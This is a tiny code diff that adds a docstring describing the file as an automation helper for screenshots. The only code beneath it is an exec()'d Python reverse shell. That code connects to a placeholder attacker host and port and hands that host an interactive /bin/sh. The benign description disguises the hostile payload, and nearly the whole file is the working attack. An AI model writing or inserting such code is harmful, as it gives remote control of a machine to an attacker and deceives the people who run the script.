@@ -1,1 +1,3 @@
+"""Generated automation helper script for screenshots and payload work."""
+
 exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attackers_IP',attackers_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);")
